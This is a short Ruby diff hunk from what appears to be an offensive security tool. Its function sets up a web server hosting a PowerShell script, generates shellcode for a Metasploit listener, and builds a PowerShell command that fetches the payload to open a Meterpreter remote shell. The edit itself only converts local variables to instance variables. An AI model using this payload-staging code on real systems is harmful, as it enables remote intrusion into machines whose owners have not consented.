@@ -92,10 +92,10 @@ def fast_meterpreter_setup
   puts '*' * 50
   puts 'Setting up webserver to host the powershell script'
   puts '*' * 50
-  web_host = @server_setup.get_host
-  web_port = @server_setup.get_port
-  shellcode = generate_shellcode(msf_host,msf_port)
-  @ssl ? powershell_command = powershell_fast_meterpreter("https://#{web_host}:#{web_port}") : powershell_command = powershell_fast_meterpreter("http://#{web_host}:#{web_port}")
+  @web_host = @server_setup.get_host
+  @web_port = @server_setup.get_port
+  @shellcode = generate_shellcode(msf_host,msf_port)
+  @ssl ? powershell_command = powershell_fast_meterpreter("https://#{@web_host}:#{@web_port}") : powershell_command = powershell_fast_meterpreter("http://#{@web_host}:#{@web_port}")
   return powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port
 end
 def start_msf(host,port)
